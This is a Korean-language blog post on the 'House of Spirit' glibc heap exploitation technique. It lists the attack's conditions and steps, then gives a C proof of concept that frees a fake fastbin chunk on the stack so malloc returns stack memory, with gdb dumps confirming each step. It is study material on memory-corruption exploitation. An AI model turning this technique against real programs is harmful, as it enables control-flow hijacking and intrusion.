---
title: House of Spirit
author: Beomsu Lee
category: [Exploitation, Heap]
tags: [exploitation, heap, house of series]
math: true
mermaid: true
---

## Conditions

- 공격자에 의해 allocated fake chunk(fastbin) 형태를 생성할 수 있어야 함
- 공격자에 의해 해당 영역(fake chunk)의 주소를 free() 함수의 인자로 전달할 수 있어야 함

## Exploit plan

1. stack에 fake chunk(fastbin) 구조 저장
2. free() 함수의 인자값으로 fake chunk 주소 전달
3. fake chunk(fastbin)의 크기와 같은 크기의 heap 영역 할당

## Proof of concept

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    fprintf(stderr, "This file demonstrates the house of spirit attack.\n");

    fprintf(stderr, "Calling malloc() once so that it sets up its memory.\n");
    malloc(1);

    fprintf(stderr, "We will now overwrite a pointer to point to a fake 'fastbin' region.\n");
    unsigned long long *a;
    // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
    unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));

    fprintf(stderr, "This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n", sizeof(fake_chunks), &fake_chunks[1], &fake_chunks[9]);

    fprintf(stderr, "This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
    fprintf(stderr, "... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
    fake_chunks[1] = 0x40; // this is the size

    fprintf(stderr, "The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n");
        // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8
    fake_chunks[9] = 0x1234; // nextsize

    fprintf(stderr, "Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
    fprintf(stderr, "... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");
    a = &fake_chunks[2];

    fprintf(stderr, "Freeing the overwritten pointer.\n");
    free(a);

    fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
    fprintf(stderr, "malloc(0x30): %p\n", malloc(0x30));
}
```

fake_chunks[10] (0x7fffffffe400)

```
gdb-peda$ x/24gx $rbp-0x60
0x7fffffffe400: 0x0000000000000001  0x00007fffffffe480
0x7fffffffe410: 0x00007ffff7ffe168  0x0000000000f0b5ff
0x7fffffffe420: 0x0000000000000001  0x00000000004008ed
0x7fffffffe430: 0x00007fffffffe45e  0x0000000000000000
0x7fffffffe440: 0x00000000004008a0  0x00000000004005b0
```

stack에 2개의 fake chunk를 만든다.

```
gdb-peda$ x/24gx $rbp-0x60
0x7fffffffe400: 0x0000000000000001  0x0000000000000040 <- Fack Chunk[1]
0x7fffffffe410: 0x00007ffff7ffe168  0x0000000000f0b5ff
0x7fffffffe420: 0x0000000000000001  0x00000000004008ed
0x7fffffffe430: 0x00007fffffffe45e  0x0000000000000000
0x7fffffffe440: 0x00000000004008a0  0x0000000000001234 <- Fake Chunk[9]
0x7fffffffe450: 0x00007fffffffe540  0x85d0ee78a5ccc700
```

변수 a에 fake chunk를 넣는다.

```
gdb-peda$ x/24gx $rbp-0x68
0x7fffffffe3f8: 0x00007fffffffe410
```

변수 a를 free 한다.

```
Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7fffffffe408.
... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.
Freeing the overwritten pointer.
```

free 후 fastbin에 stack 주소값으로 변조된 것을 확인할 수 있다.

```
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x7fffffffe400 --> 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                top: 0x603020 (size : 0x20fe0) 
    last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
```

fake chunk의 size와 같은 size를 malloc 할 경우 해당 stack 영역의 주소가 할당된다.

```
Now the next malloc will return the region of our fake chunk at 0x7fffffffe408, which will be 0x7fffffffe410!
malloc(0x30): 0x7fffffffe410
```

## References
- [The House of Spirit](https://www.lazenca.net/display/TEC/The+House+of+Spirit)